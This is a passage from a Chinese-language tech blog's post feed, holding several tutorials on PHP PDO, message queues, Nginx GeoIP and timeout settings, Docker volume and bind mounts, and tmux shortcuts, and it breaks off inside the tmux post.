class="line">;extension&#x3D;php_pdo_pgsql.dll</span><br><span class="line">;extension&#x3D;php_pdo_sqlite.dll</span><br></pre></td></tr></table></figure><h2 id="PDO-创建连接"><a href="#PDO-创建连接" class="headerlink" title="PDO 创建连接"></a>PDO 创建连接</h2><p>在使用 PDO 操作数据库之前，需要创建 PDO 连接对象。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">new PDO(DSN, username, password);&lt;?php</span><br><span class="line"></span><br><span class="line">$dsn &#x3D; &quot;mysql:host&#x3D;localhost; dbname&#x3D;databasename&quot;;</span><br><span class="line">$stmt &#x3D; new PDO($dsn, &#39;user&#39;, &#39;pwd&#39;);</span><br></pre></td></tr></table></figure><p>不同的数据库，其 DSN(Data Source Name) 构造方式是不一样的。常见数据库 DSN 语法如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F;MySQL:</span><br><span class="line">$dsn &#x3D; mysql:host&#x3D;hostname;dbname&#x3D;db_name)</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;SQLite:</span><br><span class="line">$dsn &#x3D; sqlite:db_name</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;PGSQL</span><br><span class="line">$dsn pgsql:host&#x3D;hostname port&#x3D;port_id dbname&#x3D;db_name user&#x3D;username password&#x3D;password</span><br></pre></td></tr></table></figure><h3 id="PDO-Mysql-预处理语句"><a href="#PDO-Mysql-预处理语句" class="headerlink" title="PDO Mysql 预处理语句"></a>PDO Mysql 预处理语句</h3><p><strong>预处理语句及绑定参数</strong><br>预处理语句用于执行多个相同的 SQL 语句，并且执行效率更高。</p><p>预处理语句的工作原理如下：</p><ol><li>预处理：创建 SQL 语句模板并发送到数据库。预留的值使用参数 “?” 标记 。例如：INSERT INTO MyGuests (firstname, lastname, email) VALUES(?, ?, ?)</li><li>数据库解析，编译，对SQL语句模板执行查询优化，并存储结果不输出</li><li>执行：最后，将应用绑定的值传递给参数（”?” 标记），数据库执行语句。应用可以多次执行语句，如果参数的值不一样。</li></ol><p>相比于直接执行SQL语句，预处理语句有两个主要优点：</p><ul><li>预处理语句大大减少了分析时间，只做了一次查询（虽然语句多次执行）</li><li>绑定参数减少了服务器带宽，你只需要发送查询的参数，而不是整个语句</li><li>预处理语句针对SQL注入是非常有用的，因为 参数值发送后使用不同的协议，保证了数据的合法性。</li></ul><p>PDO的直接查询和预处理分别是PDO 的 query类和 prepare 类。</p><ul><li>PDO::prepare — 备要执行的SQL语句并返回一个 PDOStatement 对象</li><li>PDO::query — 执行 SQL 语句，返回PDOStatement对象,可以理解为结果集</li><li>前者其实就是执行 sql 语句，返回一个结果集对象（PDOStatement），然后操作 PDOStatement类，从结果集中取出相应的数据。</li><li>后者虽然也会返回一个 PDOSTatement 对象，但区别就在于两者的处理方式不同。query 是直接执行 sql 语句，而 prepare 是通过预处理的方式执行 sql 语句（更安全，更高效）。</li></ul><h3 id="错误处理"><a href="#错误处理" class="headerlink" title="错误处理"></a>错误处理</h3><p>PDO 默认开启的是错误码模式，如果发生了错误，只会简单地输出错误码，这对于调试或者测试来说，不是很友好，不利用快速定位异常所在。</p><p>所以PDO 还为我们提供了另外两种方式：</p><h4 id="PDO-ERRMODE-WARNING"><a href="#PDO-ERRMODE-WARNING" class="headerlink" title="PDO::ERRMODE_WARNING"></a>PDO::ERRMODE_WARNING</h4><p>除设置错误码之外，PDO 还将发出一条传统的 E_WARNING 信息。如果只是想看看发生了什么问题且不中断应用程序的流程，那么此设置在调试/测试期间非常有用。</p><h4 id="PDO-ERRMODE-EXCEPTION"><a href="#PDO-ERRMODE-EXCEPTION" class="headerlink" title="PDO::ERRMODE_EXCEPTION"></a>PDO::ERRMODE_EXCEPTION</h4><p>除设置错误码之外，PDO 还将抛出一个 PDOException 异常类并设置它的属性来反射错误码和错误信息。此设置在调试期间也非常有用，因为它会有效地放大脚本中产生错误的点，从而可以非常快速地指出代码中有问题的潜在区域（记住：如果异常导致脚本终止，则事务被自动回滚）。</p><p>创建 PDO 实例并设置错误模式：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$dsn &#x3D; &#39;mysql:dbname&#x3D;testdb;host&#x3D;127.0.0.1&#39;;</span><br><span class="line">$user &#x3D; &#39;dbuser&#39;;</span><br><span class="line">$password &#x3D; &#39;dbpass&#39;;</span><br><span class="line"></span><br><span class="line">try &#123;</span><br><span class="line">    $dbh &#x3D; new PDO($dsn, $user, $password);</span><br><span class="line">    &#x2F;&#x2F; 开启ERRMODE_EXCEPTION 模式</span><br><span class="line">    $dbh-&gt;setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);</span><br><span class="line">&#125; catch (PDOException $e) &#123;</span><br><span class="line">    echo &#39;Connection failed: &#39; . $e-&gt;getMessage();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><h3 id="参考链接："><a href="#参考链接：" class="headerlink" title="参考链接："></a>参考链接：</h3><ul><li><a href="http://www.5idev.com/p-php_pdo.shtml" target="_blank" rel="noopener">PHP PDO</a></li><li><a href="http://www.5idev.com/p-php_pdo_query.shtml" target="_blank" rel="noopener">PHP PDO-&gt;query类</a></li><li><a href="https://www.w3cschool.cn/php/php-mysql-prepared-statements.html" target="_blank" rel="noopener">PHP Mysql 预处理语句</a></li><li><a href="https://www.w3cschool.cn/php/php-mysql-connect.html" target="_blank" rel="noopener">PHP 多种方式连接Mysql </a></li></ul>]]></content>
      
      
      <categories>
          
          <category> PHP </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PHP </tag>
            
            <tag> PDO </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>消息队列快速上手</title>
      <link href="/quick-start-message-queue/"/>
      <url>/quick-start-message-queue/</url>
      
        <content type="html"><![CDATA[<p>业务场景描述：</p><ol><li>订单创建成功之后，每一笔订单都需要进行统计及其他业务处理。</li><li>如何及时发现处理失败的订单，然后进行补单处理。</li><li>订单所产生佣金的处理。</li></ol><a id="more"></a><h2 id="困境"><a href="#困境" class="headerlink" title="困境"></a>困境</h2><p>该应用因为一些历史原因使用 Mysql 的数据表作为消息队列。</p><p>整个系统中有多个生产者会向该数据表中插入记录，同时有一个脚本会作为消费者去数据库中查找记录并消费。</p><p>但是这样做是存在很多问题：</p><ol><li>长时间与数据库保持连接进行查询操作，消耗服务器资源。</li><li>在数据量较大或者延时较高的情况下，不能及时处理完，会影响其他业务。</li><li>…</li></ol><p>所以更好的方式应该是使用消息队列来解决。</p><h2 id="什么是消息队列？"><a href="#什么是消息队列？" class="headerlink" title="什么是消息队列？"></a>什么是消息队列？</h2><p>消息队列（Message Queue），是分布式系统中重要的组件，其通用的使用场景可以简单地描述为：</p><blockquote><p>当不需要立即获得结果，但是并发量又需要进行控制的时候，差不多就是需要使用消息队列的时候。</p></blockquote><h3 id="常见应用场景"><a href="#常见应用场景" class="headerlink" title="常见应用场景"></a>常见应用场景</h3><p>其常见的应用场景有以下几个：</p><ul><li>应用耦合：多应用间通过消息队列对同一消息进行处理，避免调用接口失败导致整个过程失败；</li><li>异步处理：多应用对消息队列中同一消息进行处理，应用间并发处理消息，相比串行处理，减少处理时间；</li><li>限流削峰：广泛应用于秒杀或抢购活动中，避免流量过大导致应用系统挂掉的情况；</li><li>消息驱动的系统：系统分为消息队列、消息生产者、消息消费者，生产者负责产生消息，消费者(可能有多个)负责对消息进行处理；</li></ul><h4 id="1-异步处理"><a href="#1-异步处理" class="headerlink" title="1. 异步处理"></a>1. 异步处理</h4><p>场景描述：用户注册之后，需要邮箱或者短信通知，传统的做法有两种：</p><p>串行：</p><ol><li>注册成功</li><li>发送邮件</li><li>发送短信</li></ol><p>只有等以上三个任务全部完成之后，才会返回客户端。</p><p>并行：</p><ol><li>注册成功</li><li>发送邮件并同时发送短信</li></ol><p>虽然也是需要以上三个任务全部完成才会返回客户端，但并行与串行的区别就在于，通过使用多线程来缩短程序处理时间。</p><p>假设三个业务节点每个使用50毫秒钟，不考虑网络等其他开销，则串行方式的时间是150毫秒，并行的时间可能是100毫秒。</p><p>因为CPU在单位时间内处理的请求数是一定的，假设CPU1秒内吞吐量是100次。则串行方式1秒内CPU可处理的请求量是7次（1000/150）。并行方式处理的请求量是10次（1000/100）。</p><p>就该场景而言，如何突破传统方式带来的性能瓶颈？</p><p>解决方案：</p><ol><li>引入消息队列</li><li>将不是必须的业务逻辑，加入队列中，进行异步处理。</li></ol><h4 id="2-应用解耦"><a href="#2-应用解耦" class="headerlink" title="2. 应用解耦"></a>2. 应用解耦</h4><h3 id="消息队列模式"><a href="#消息队列模式" class="headerlink" title="消息队列模式"></a>消息队列模式</h3><p>消息队列包括两种模式，点对点模式（point to point， queue）和发布/订阅模式（publish/subscribe，topic）。</p><h4 id="点对点模式"><a href="#点对点模式" class="headerlink" title="点对点模式"></a>点对点模式</h4><p>点对点模式包括以下三个角色：</p><ol><li>消息队列</li><li>生产者</li><li>消费者</li></ol><p>生产者将消息发送到队列中，消费者从队列中取出消息进行消费，消息被消费之后，消息不再被存储。</p><p><img src="https://cdn.jsdelivr.net/gh/0xAiKang/CDN/blog/images/20201009193326.png" alt=""></p><p>点对点模式的特点：</p><ol><li>每个消息只有一个接收者（Consumer）(即一旦被消费，消息就不再在消息队列中)。</li><li>生产者和消费者之间没有依赖性，不会因为消费者是否在线，都会存在于队列中。</li></ol><h4 id="发布-订阅模式"><a href="#发布-订阅模式" class="headerlink" title="发布/订阅模式"></a>发布/订阅模式</h4><p>发布/订阅模式下包括三个角色：</p><ol><li>频道</li><li>发布者</li><li>订阅者</li></ol><p>发布者将消息发布在频道中，频道将消息传递给所有订阅者。</p><p><img src="https://cdn.jsdelivr.net/gh/0xAiKang/CDN/blog/images/20201009193341.png" alt=""></p><p>发布/订阅模式特点：</p><ol><li>每个消息可以有多个订阅者</li><li>发布者和订阅者之间存在依赖关系，必须先订阅频道，发布者发布的消息才会被订阅者所接收。</li><li>因为发布的消息是无状态的，所以订阅者需要订阅频道且在线。</li></ol><h3 id="常见消息队列"><a href="#常见消息队列" class="headerlink" title="常见消息队列"></a>常见消息队列</h3><ul><li>RabbitMQ</li><li>ActiveMQ</li><li>RocketMQ</li><li>Kafka</li><li>Redis</li></ul><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><ul><li><a href="https://www.cnblogs.com/centos2017/p/10451411.html" target="_blank" rel="noopener">为什么会需要消息队列(MQ)？</a></li><li><a href="https://www.cnblogs.com/wt645631686/p/8243438.html" target="_blank" rel="noopener">PHP(Mysql/Redis)消息队列的介绍及应用场景案例</a></li><li><a href="https://cloud.tencent.com/developer/article/1006035" target="_blank" rel="noopener">消息队列及常见消息队列介绍</a></li><li><a href="https://segmentfault.com/q/1010000021533696" target="_blank" rel="noopener">PHP大量数据写入文档，如何异步处理？</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> MQ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> MQ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Nginx 如何根据 IP 获取地域信息</title>
      <link href="/how-does-nginx-obtain-geographic-information-based-on-ip/"/>
      <url>/how-does-nginx-obtain-geographic-information-based-on-ip/</url>
      
        <content type="html"><![CDATA[<p>最近有一个需求：需要根据用户的IP 获取其国家，然后根据不同国家进行代理转发。</p><a id="more"></a><p>想要完成这个需求，首先第一个解决的问题就是获取IP 地址所对应的地理位置：</p><ol><li>这个需求通常是由 GeoIP 这个模块来完成的，Nginx 默认没有开启该模块。</li><li>GeoIP 是基于 maxmind 提供的数据文件进行分析的，所以还需要下载 maxmind 的数据源文件。</li></ol><h3 id="安装GeoIP-模块"><a href="#安装GeoIP-模块" class="headerlink" title="安装GeoIP 模块"></a>安装GeoIP 模块</h3><p>前面也提到了MaxMind GeoLite Legacy数据库目前已停产，应改用MaxMind GeoIP2或Geolite2数据库和NGINX Plus GeoIP2模块。</p><p>Centos：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">yum install nginx-plus-module-geoip2</span><br></pre></td></tr></table></figure><p>Ubuntu：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install nginx-plus-module-geoip2</span><br></pre></td></tr></table></figure><p>然后将 load_module 指令都放在nginx.conf 的配置文件的顶部：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">load_module modules&#x2F;ngx_http_geoip2_module.so;</span><br><span class="line">load_module modules&#x2F;ngx_stream_geoip2_module.so;</span><br><span class="line"></span><br><span class="line">http &#123;</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="安装-GeoIP-数据源"><a href="#安装-GeoIP-数据源" class="headerlink" title="安装 GeoIP 数据源"></a>安装 GeoIP 数据源</h3><p>自从 2019年12月30日开始，就不能直接从MaxMind 上下载了，需要先注册一个账号，获取 license key，然后wget 时带上 key。具体可以查阅<a href="https://blog.maxmind.com/2019/12/18/significant-changes-to-accessing-and-using-geolite2-databases/" target="_blank" rel="noopener">这篇文章</a>。</p><p>这是一种安装方式，如果觉得麻烦，可以尝试下面这种方式。</p><ol><li><p>安装依赖：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sudo add-apt-repository ppa:maxmind&#x2F;ppa</span><br><span class="line">sudo apt update</span><br><span class="line">sudo apt install libgeoip1 libgeoip-dev geoip-bin</span><br></pre></td></tr></table></figure></li><li><p>下载源码包，安装应用：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">sudo wget https:&#x2F;&#x2F;github.com&#x2F;maxmind&#x2F;geoip-api-c&#x2F;releases&#x2F;download&#x2F;v1.6.12&#x2F;GeoIP-1.6.12.tar.gz</span><br><span class="line"></span><br><span class="line">sudo tar -zxvf GeoIP-1.6.12.tar.gz</span><br><span class="line">cd GeoIP-1.6.12 &amp;&amp; \</span><br><span class="line">.&#x2F;configure &amp;&amp; \</span><br><span class="line">make &amp;&amp; sudo make install</span><br></pre></td></tr></table></figure></li><li><p>查找<code>GeoIP.dat</code>所在位置：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo find &#x2F; -name GeoIP.dat</span><br><span class="line">&#x2F;usr&#x2F;share&#x2F;GeoIP&#x2F;GeoIP.dat</span><br></pre></td></tr></table></figure></li><li><p>在配置文件中使用：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">geoip_country &#x2F;etc&#x2F;nginx&#x2F;geoip&#x2F;GeoIP-1.6.12&#x2F;data&#x2F;GeoIP.dat;</span><br><span class="line"></span><br><span class="line">server &#123;</span><br><span class="line">  ...</span><br><span class="line">  </span><br><span class="line">  location &#x2F;myip &#123;</span><br><span class="line">        default_type text&#x2F;plain;</span><br><span class="line">        return 200 &quot;$remote_addr $geoip_country_name $geoip_country_code $geoip_city&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ol><p>通过以下变量综合获取地域信息：</p><ul><li><code>$remote_addr</code>：IP地址</li><li><code>$geoip_country_name</code>：国家</li><li><code>$geoip_country_code</code>：对应编码</li><li><code>$geoip_city</code>：城市名称</li></ul><h3 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h3><ul><li><a href="https://www.geek-share.com/detail/2733570382.html" target="_blank" rel="noopener">nginx: [emerg] unknown directive “geoip_country” in /etc/nginx/nginx.conf:23</a></li><li><a href="https://github.com/maxmind/geoip-api-c" target="_blank" rel="noopener">install GeoIP</a></li><li><a href="https://docs.nginx.com/nginx/admin-guide/dynamic-modules/geoip2/" target="_blank" rel="noopener">install GeoIP module</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> Nginx </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Nginx </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Docker 数据挂载</title>
      <link href="/docker-data-mount/"/>
      <url>/docker-data-mount/</url>
      
        <content type="html"><![CDATA[<h3 id="数据挂载"><a href="#数据挂载" class="headerlink" title="数据挂载"></a>数据挂载</h3><p>数据挂载在Docker 中还是挺重要的一部分，因为有多种方式，而不同的方式所对应的处理数据的逻辑也不一样。</p><ol><li>Volumes：Docker 管理宿主机文件系统的一部分（/var/lib/docker/volumes）。</li><li>Bind Mounts：将宿主机上的任意位置的文件或目录挂载到容器中。</li><li>tmpfs：挂载存储在主机系统的内存中，而不会写入主机的文件系统。如果不系统将数据持久存储在任何位置，可以使用tmpfs，同时避免写入容器可写层提高性能。</li></ol><p>这里主要介绍前两者，后者使用的并不多。注意第一种和第二种是存在区别的，前者是使用的数据卷进行挂载，而后者则是直接使用的宿主机上的文件或者目录挂载到容器中。</p><p>众所周知，将容器删除之后，容器内所有的改动将不复存在。</p><p>挂载数据卷通常是最常用且最好的方式，这种方式会将容器中的数据持久化在宿主机中，这样做的好处就是当容器被删除或者无法正常启动时，数据仍是完整的。</p><p>挂载数据卷有两种方式：</p><ol><li>使用<code>--mount</code></li><li>使用<code>-v</code></li></ol><p>前者是新版本的方式，后者是老版本的方式，其效果都是一样的。</p><h4 id="Volumes"><a href="#Volumes" class="headerlink" title="Volumes"></a>Volumes</h4><p>创建一个数据卷：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker volume create &lt;volume name&gt;</span><br></pre></td></tr></table></figure><p>列出数据卷列表：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker volume ls</span><br></pre></td></tr></table></figure><p>列出数据卷的详情信息：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker volume inspect &lt;volume name&gt;</span><br></pre></td></tr></table></figure><p>删除数据卷：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker volume rm &lt;volume name&gt;</span><br></pre></td></tr></table></figure><p>用数据卷创建一个容器：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"># 新版本</span><br><span class="line">docker run -d -it \</span><br><span class="line">--name&#x3D;nginx --mount src&#x3D;&lt;volume name&gt;,dst&#x3D;&#x2F;usr&#x2F;share&#x2F;nginx&#x2F;html \</span><br><span class="line">nginx</span><br><span class="line"></span><br><span class="line"># 老版本</span><br><span class="line">docker run -d -it \</span><br><span class="line">--name&#x3D;nginx -v &lt;volume name&gt;:&#x2F;usr&#x2F;share&#x2F;nginx&#x2F;html \</span><br><span class="line">nginx</span><br></pre></td></tr></table></figure><p>需要注意的是：</p><ol><li>如果没有指定数据卷，则会自动创建</li></ol><h4 id="Bind-Mounts"><a href="#Bind-Mounts" class="headerlink" title="Bind Mounts"></a>Bind Mounts</h4><p>使用bind mounts 创建一个容器：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"># 新版本</span><br><span class="line">docker run -d -it \</span><br><span class="line">--name nginx \</span><br><span class="line">-p 8080:80 \</span><br><span class="line">--mounts type&#x3D;bind,src&#x3D;&#x2F;var&#x2F;www,dst&#x3D;&#x2F;usr&#x2F;share&#x2F;nginx&#x2F;html \</span><br><span class="line">nginx</span><br><span class="line"></span><br><span class="line"># 老版本</span><br><span class="line">docker run -d -it \</span><br><span class="line">--name nginx \</span><br><span class="line">-p 8080:80 \</span><br><span class="line">-v &#x2F;var&#x2F;www:&#x2F;usr&#x2F;share&#x2F;nginx&#x2F;html \</span><br><span class="line">nginx</span><br></pre></td></tr></table></figure><p>需要注意的是： </p><ol><li>如果源文件/目录没有存在，docker 不会自动创建，而会自动抛出一个错误。</li><li>如果挂载目标在容器中是非空目录，则该目录现有内容将被隐藏。</li></ol>]]></content>
      
      
      <categories>
          
          <category> Docker </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Docker </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>nginx 超时问题——upstream timed out (110: Connection timed out) while reading response header from upstream</title>
      <link href="/nginx-timeout-problem-upstream-timed-out-110-Connection-timed-out-while-reading-response-header-from-upstream/"/>
      <url>/nginx-timeout-problem-upstream-timed-out-110-Connection-timed-out-while-reading-response-header-from-upstream/</url>
      
        <content type="html"><![CDATA[<p>今天早上起来，发现后台登录不上，打开控制台发现几乎所有请求都超时了。</p><a id="more"></a><p>打开nginx 的异常日志可以看到全是相同的异常：</p><blockquote><p>upstream timed out (110: Connection timed out) while reading response header from upstream</p></blockquote><p>从这个异常日志可以分析出，由于nginx 代理去获取上游服务器的响应超时了，那么究竟是什么原因导致它会超时呢？</p><p>通常会导致请求超时可能有以下几个原因：</p><ol><li>接口比较复杂，响应时间慢，导致超时。</li><li>处理请求的进程异常。</li><li>代理服务器与上游服务器的网络问题。</li></ol><p>因为请求一直都是那些请求，所以第一种可能性可以排除。<br>另外子进程数量设置的是比较大，所以第二种应该也可以排除。</p><p>对于服务器的网络问题，如果条件允许，可以直接从根本上解决，另外也可以通过设置超时时间来延缓请求超时。</p><p>在server 中添加以下配置：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">large_client_header_buffers 4 16k;</span><br><span class="line">client_max_body_size 30m;</span><br><span class="line">client_body_buffer_size 128k;</span><br><span class="line"></span><br><span class="line">proxy_connect_timeout 240s;</span><br><span class="line">proxy_read_timeout 240s;</span><br><span class="line">proxy_send_timeout 240s;</span><br><span class="line">proxy_buffer_size 64k;</span><br><span class="line">proxy_buffers   4 32k;</span><br><span class="line">proxy_busy_buffers_size 64k;</span><br><span class="line">proxy_temp_file_write_size 64k;</span><br></pre></td></tr></table></figure><p>然后重启Nginx。</p><h3 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h3><ul><li><a href="http://nginx.org/en/docs/http/ngx_http_proxy_module.html#proxy_read_timeout" target="_blank" rel="noopener">nginx 设置超时时间-Nginx 官网</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> Nginx </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PHP </tag>
            
            <tag> Nginx </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Tmux 快速上手</title>
      <link href="/tmux-quick-start/"/>
      <url>/tmux-quick-start/</url>
      
        <content type="html"><![CDATA[<p>本来之前就知道有 <code>tmux</code> 这样一个窗口分隔工具，只不过一直使用着<code>iTerm2</code>，本身就自带有标签页功能，所以就一直没去学习这个工具。</p><p>这段时间需要经常访问<code>Linux</code>服务器，所以在服务器上安装了这个工具。</p><h2 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h2><p>Mac：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">brew install tmux</span><br></pre></td></tr></table></figure><p>Linux:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apt-get install tmux</span><br></pre></td></tr></table></figure><p>一般情况下 <code>tmux</code> 中所有的快捷键都需要和前缀快捷键 <code>⌃b</code> 来组合使用（注：⌃ 为 Mac 的 control 键），以下是常用的窗格（<code>pane</code>）快捷键列表。</p><h3 id="会话"><a href="#会话" class="headerlink" title="会话"></a>会话</h3><p>第一次使用<code>tmux</code> 可能会被<code>Session</code>、<code>窗口</code>、<code>窗格</code> 这些陌生的概念，弄得摸不着头脑。</p><p>这里总结成一句话就是：<br><strong>一个完整的会话（Session）是由数个窗口组成，而一个窗口又可以分成若各个窗格。</strong></p><p>使用<code>tmux</code> 命令会默认新建一个<code>tmux</code> 会话：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F; 默认新建一个Session 名称为 0 的窗口。</span><br><span class="line">tmux</span><br></pre></td></tr></table></figure><p>常用<code>Session</code>操作：</p><ul><li>$ 重命名当前会话</li><li>s 选择会话列表</li><li>d 退出当前会话（不是删除），运行后将会退出 tmux 进程，返回至 shell 主进程。</li></ul><h3 id="窗口"><a href="#窗口" class="headerlink" title="窗口"></a>窗口</h3><p>窗口的概念不同于窗格，窗口互不影响，窗格相互分隔。</p><p>常用窗口操作：</p><ul><li>c 新建窗口，此时当前窗口会切换至新窗口，不影响原有窗口的状态</li><li>p 切换至上一窗口</li><li>n 切换至下一窗口</li><li>w 窗口列表选择，注意 macOS 下使用 ⌃p 和 ⌃n 进行上下选择</li><li>&amp; 关闭当前窗口</li><li>, 重命名窗口，可以使用中文，重命名后能在 tmux 状态栏更快速的识别窗口 id</li><li>0 切换至 0 号窗口，使用其他数字 id 切换至对应窗口</li><li>f 根据窗口名搜索选择窗口，可模糊匹配</li></ul><h3 id="窗格"><a href="#窗格" class="headerlink" title="窗格"></a>窗格</h3><p>窗格是在窗口下的概念，若干个窗格组成一个窗口。</p><p>常用窗格操作：</p><ul><li>% 左右平分出两个窗格</li><li>“ 上下平分出两个窗格</li><li>x 关闭当前窗格</li><li>{ 当前窗格前移</li><li>} 当前窗格后移</li><li>; 选择上次使用的窗格</li><li>o 选择下一个窗格，也可以使用上下左右方向键来选择</li><li>space 切换窗格布局，tmux 内置了五种窗格布局，也可以通过 ⌥1 至 ⌥5来切换</li><li>z 最大化当前窗格，再次执行可恢复原来大小</li><li>q 显示所有窗格的序号，在序号出现期间按下对应的数字，即可跳转至对应的窗格</li></ul><h3 id="其他命令"><a href="#其他命令" class="headerlink" title="其他命令"></a>其他命令</h3><p>上面那些命令都是配合<code>⌃ + b</code>快捷键使用的，下面的这些命令都是在<code>Shell</code>进程中直接执行的。</p><p>新建名称为 foo 的会话</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tmux new -s foo</span><br></pre></td></tr></table></figure><p>列出所有 tmux 会话</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tmux ls</span><br></pre></td></tr></table></figure><p>恢复上一次会话</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tmux a</span><br></pre></td></tr></table></figure><p>恢复名为 foo 的会话</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tmux a -t foo</span><br></pre></td></tr></table></figure><p>删除名为 foo 的会话</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tmux kill -session -t foo</span><br></pre></td></tr></table></figure><p>删除所有会话</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tmux kill -server</span><br></pre></td></tr></table></figure><h3 id="tmux-or-iterm2"><a href="#tmux-or-iterm2" class="headerlink" title="tmux or iterm2"></a>tmux or iterm2</h3><p><code>tmux</code> 和<code>iTerm2</code> 都有窗口管理方面的功能，只是前者相比后者的优势在于：</p><ul><li><code>iTerm2</code> 的窗格切换快捷键（<code>⌘⌥→</code>）容易与其他软件全局快捷键冲突（例如 <code>Spectacle</code> 的窗口分割快捷键），<code>tmux</code> 由于存在前缀快捷键，所以不存在快捷键冲突问题；</li><li><code>tmux</code> 可以在终端软件重启后通过命令行恢复上次的 <code>session</code> 